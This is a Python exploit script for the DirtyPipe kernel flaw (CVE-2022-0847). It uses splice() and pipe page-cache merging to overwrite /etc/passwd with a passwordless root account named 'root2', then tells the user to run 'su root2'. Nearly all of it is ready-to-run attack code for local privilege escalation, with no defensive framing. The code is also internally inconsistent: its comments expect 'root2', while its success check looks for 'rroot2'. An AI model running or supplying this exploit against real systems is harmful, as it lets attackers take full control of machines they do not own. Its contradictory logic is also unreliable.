#!/usr/bin/env python3
"""
dirtypipe_passwd.py — CVE-2022-0847 (DirtyPipe) /etc/passwd overwrite
Tested on: Linux kernel 5.16.0

Injects a passwordless root account by overwriting /etc/passwd line 0
via pipe page-cache abuse.

Note on the 1-byte offset quirk:
  splice() always writes 1 byte from the original file before the payload.
  /etc/passwd line 0 starts with 'r' (from 'root'), so naming the injected
  user 'oot2' results in 'root2' after the prepended byte.

Usage:
  python3 dirtypipe_passwd.py
  su root2
"""

import os
import ctypes
import sys

def dirtypipe_overwrite(target_path: str, payload: bytes) -> bool:
    libc = ctypes.CDLL("libc.so.6", use_errno=True)

    orig_size = os.path.getsize(target_path)

    # Pad or truncate payload to exact original file size
    if len(payload) < orig_size:
        payload = payload + b'\x00' * (orig_size - len(payload))
    else:
        payload = payload[:orig_size]

    # Create pipe and fill it to set PIPE_BUF_FLAG_CAN_MERGE
    r, w = os.pipe()
    os.write(w, b'\x00' * 65536)
    os.read(r, 65536)

    # splice 1 byte from target into pipe — this anchors the page cache entry
    fd = os.open(target_path, os.O_RDONLY)
    off = ctypes.c_int64(0)
    ret = libc.splice(fd, ctypes.byref(off), w, None, 1, 0)
    if ret < 0:
        print(f"[-] splice failed: {ctypes.get_errno()}", file=sys.stderr)
        os.close(fd)
        os.close(r)
        os.close(w)
        return False

    # Write payload into pipe — merges into the page cache of target_path
    written = os.write(w, payload)
    os.close(fd)
    os.close(r)
    os.close(w)

    print(f"[+] splice ret={ret}, payload written={written} bytes")
    return True


def main():
    target = "/etc/passwd"

    print(f"[*] Reading {target}...")
    with open(target, "r") as f:
        content = f.read()

    lines = content.split("\n")
    original_line0 = lines[0]

    # 'r' will be prepended by splice → 'oot2' becomes 'root2'
    injected_user = "oot2::0:0:root:/root:/bin/bash"
    lines[0] = injected_user
    new_content = "\n".join(lines).encode()

    print(f"[*] Original line 0: {original_line0}")
    print(f"[*] Injecting:       r{injected_user}  (splice prepends 'r')")
    print(f"[*] Overwriting {target}...")

    if dirtypipe_overwrite(target, new_content):
        result = open(target).readline().strip()
        print(f"[+] New line 0: {result}")
        if result.startswith("rroot2"):
            print("[+] Success! Run: su root2")
        else:
            print("[!] Unexpected result — check manually")
    else:
        print("[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
